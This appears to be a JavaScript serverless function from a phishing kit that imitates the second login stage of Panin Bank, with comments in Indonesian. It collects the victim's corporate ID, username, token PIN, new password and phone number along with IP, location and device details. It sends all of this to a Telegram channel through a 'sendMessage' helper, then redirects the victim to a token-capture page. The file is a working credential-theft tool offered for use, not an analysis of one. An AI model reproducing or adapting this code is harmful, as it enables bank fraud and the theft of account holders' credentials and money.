const { sendMessage } = require('../utils');

/**
 * Serverless Function untuk menangani login tahap 2 (menggantikan auth/2.php).
 * Karena Vercel Serverless Function tidak memiliki sesi (session) seperti PHP,
 * data dari tahap 1 harus dikirimkan kembali dari client-side.
 * @param {object} req - Objek permintaan (request).
 * @param {object} res - Objek respons (response).
 */
module.exports = async (req, res) => {
    // Hanya menerima metode POST
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    // Ambil data dari body permintaan (termasuk data dari tahap 1 yang dikirim ulang)
    const {
        j_corp_id,
        j_username,
        j_token_pin,
        j_password,
        j_confirm_password,
        j_phone_number,
        ip_address,
        country,
        city,
        region,
        isp,
        device,
        os,
        browser
    } = req.body;

    // Validasi input wajib dan konfirmasi password
    if (!j_password || !j_confirm_password || !j_phone_number || (j_password !== j_confirm_password)) {
        // Dalam kasus Vercel, kita kirim respons error JSON
        res.status(400).json({
            success: false,
            message: 'Data tidak valid. Pastikan semua kolom terisi dan konfirmasi password sesuai.'
        });
        return;
    }

    // Format pesan notifikasi Telegram
    const message = `
    --- 🏦 Panin Bank Login 2 ---

    - ID Perusahaan     : ${j_corp_id || 'Tidak Diketahui'}
    - ID Pengguna       : ${j_username || 'Tidak Diketahui'}
    - Kode Token        : ${j_token_pin || 'Tidak Diketahui'}

    - Password Baru     : ${j_password}
    - Nomor HP          : ${j_phone_number}

    --- ℹ️ Informasi Pengunjung ---
    - Alamat IP         : ${ip_address || 'Tidak Diketahui'}
    - Negara            : ${country || 'Tidak Diketahui'}
    - Kota              : ${city || 'Tidak Diketahui'}
    - Wilayah           : ${region || 'Tidak Diketahui'}
    - ISP               : ${isp || 'Tidak Diketahui'}
    - Perangkat         : ${device || 'Tidak Diketahui'}
    - Sistem Operasi    : ${os || 'Tidak Diketahui'}
    - Browser           : ${browser || 'Tidak Diketahui'}
    ------------------------------
    `;

    // Kirim pesan ke Telegram
    await sendMessage(message);

    // Kirim respons sukses dan arahkan ke halaman berikutnya
    res.status(200).json({
        success: true,
        redirect: '/token.html' // Mengubah ke token.html (asumsi ini adalah halaman berikutnya)
    });
};
